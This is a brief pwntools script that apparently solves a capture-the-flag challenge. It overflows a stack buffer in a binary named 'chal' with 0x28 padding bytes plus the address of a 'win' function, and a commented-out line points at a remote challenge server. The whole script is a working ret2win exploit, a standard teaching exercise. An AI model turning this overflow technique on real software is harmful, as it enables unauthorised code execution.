from pwn import *

elf = ELF('chal')

p = process([elf.path])
#p = remote("ship.oasis.cryptonite.live",1337)


win_addr = p64(elf.symbols['win'])

payload = b'a' * 0x28 + win_addr

p.recvuntil(b'....')
p.sendline(payload)
p.interactive()
